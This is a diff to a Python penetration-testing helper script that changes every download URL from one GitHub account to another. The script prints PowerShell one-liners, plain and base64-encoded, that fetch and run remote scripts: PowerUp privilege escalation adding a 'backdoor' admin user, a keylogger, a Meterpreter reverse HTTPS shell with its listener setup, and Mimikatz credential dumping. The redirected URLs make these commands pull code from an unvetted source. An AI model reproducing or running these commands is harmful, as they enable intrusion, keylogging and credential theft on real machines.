@@ -71,11 +71,11 @@ Privilege Escalation:
         clear()
         print "[*]Description: Search for vulnerable service privilege opportunities. Original: https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp"
         print "[*]Download from internet and execute:"
-        print run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
+        print run_execute + "https://raw.githubusercontent.com/rubicondimitri/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
         print "\n[*]Run from a local copy of the script:"
         print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"'
         print "\n[*]Base64 encoded version download and execute:"
-        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks")
+        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/rubicondimitri/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks")
         print "powershell.exe -enc " + x
     
     if ans == "2":
@@ -83,22 +83,22 @@ Privilege Escalation:
         print "[*]Description: Abuse vulnerable service privilege opportunities.  Original: https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp" 
         ans_service = raw_input("Service Name: ") 
         print "[*]Download from internet and execute:"
-        print run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName "+ans_service+" -UserName backdoor -Password password123 -Verbose"
+        print run_execute + "https://raw.githubusercontent.com/rubicondimitri/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName "+ans_service+" -UserName backdoor -Password password123 -Verbose"
         print "\n[*]Run from a local copy of the script:"
         print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Write-ServiceEXE -ServiceName '+ans_service+' -UserName backdoor -Password password123 -Verbose}"'
         print "\n[*]Base64 encoded version download and execute:"
-        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName  "+ans_service+" -UserName backdoor -Password password123 -Verbose")
+        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/rubicondimitri/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName  "+ans_service+" -UserName backdoor -Password password123 -Verbose")
         print "powershell.exe -enc " + x
     
     if ans == "3":
         clear()
         print "[*]Description: Write-UserAddMSI - If the AlwaysInstallElevated key is enabled for MSI files, Create an MSI to create local admin"
         print "[*]Download from internet and execute:"
-        print run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI"
+        print run_execute + "https://raw.githubusercontent.com/rubicondimitri/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI"
         print "\n[*]Run from a local copy of the script:"
         print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Write-UserAddMSI}"'
         print "\n[*]Base64 encoded version download and execute:"
-        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI")
+        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/rubicondimitri/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI")
         print "powershell.exe -enc " + x
 
 def key():
@@ -106,11 +106,11 @@ def key():
     print "Keylogging:"
     print "[*]Description: Keylogger Saving Strokes to C:\Users\Public\key.log Original: https://github.com/mattifestation/PowerSploit"
     print "[*]Download from internet and execute:"
-    print run_execute + "https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log"
+    print run_execute + "https://raw.githubusercontent.com/rubicondimitri/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log"
     print "\n[*]Run from a local copy of the script:"
     print 'powershell.exe -exec bypass -Command "& {Import-Module .\Get-Keystrokes.ps1; Get-Keystrokes -LogPath C:\Users\Public\key.log}"'
     print "\n[*]Base64 encoded version download and execute:"
-    x = powershell_encode(run_execute + "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log")
+    x = powershell_encode(run_execute + "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rubicondimitri/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log")
     print "powershell.exe -enc " + x
     
 def lat():
@@ -140,11 +140,11 @@ def metasploit():
     ans_lport = raw_input("LPORT: ")
     clear() 
     print "[*]Download from internet and execute:"
-    print "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force"
+    print "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rubicondimitri/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force"
     print "\n[*]Run from a local copy of the script:"
     print 'powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-Shellcode.ps1; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost '+ans_lhost+' -Lport '+ans_lport+' -Force}"'
     print "\n[*]Base64 encoded version download and execute:"
-    x = powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force")
+    x = powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rubicondimitri/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force")
     print "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + x
     print "\n[*]Listner Resource Script (listener.rc) - Save the following to a file called listener.rc on your Kali box and load your handler with msfconsole -r listener.rc"
     print "use multi/handler \nset payload windows/meterpreter/reverse_https \nset LHOST " + ans_lhost + "\nset LPORT " + ans_lport + "\nset ExitOnSession false \nexploit -j"
@@ -207,7 +207,7 @@ while ans:
             print "[*]Powershell.exe -NoP -Exec Bypass -enc " + powershell_encode(code)
  
     elif ans == 8:
-        print "[*]Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
-        print "\n[*]Base64 encoded version download and execute:\nPowershell.exe -NoP -NonI -Exec Bypass -enc " + powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz")
+        print "[*]Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rubicondimitri/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
+        print "\n[*]Base64 encoded version download and execute:\nPowershell.exe -NoP -NonI -Exec Bypass -enc " + powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rubicondimitri/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz")
     elif ans == 99:
         sys.exit(0)
